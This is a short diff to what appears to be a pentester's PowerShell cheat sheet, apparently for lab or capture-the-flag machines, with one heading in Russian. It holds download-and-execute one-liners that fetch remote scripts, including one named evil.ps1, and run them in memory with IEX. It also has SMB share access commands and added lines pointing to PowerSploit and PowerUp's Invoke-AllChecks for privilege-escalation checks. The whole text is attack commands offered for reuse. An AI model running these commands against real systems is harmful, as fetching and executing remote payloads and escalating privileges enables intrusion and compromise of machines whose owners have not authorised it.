@@ -62,8 +62,19 @@ iwr -uri http://10.10.14.9/test -outfile test
 
 IEX(IWR('10.10.10.10/script.ps1'))
 
+
 # Доступ к ресурсу SMB
 
 Get-Content //10.10.14.4/file
 
 net use z: //10.10.10.14/shares 
+
+# PowerShellMafia
+
+https://github.com/PowerShellMafia/PowerSploit.git
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
+
+PowerUP
+
+Invoke-AllChecks
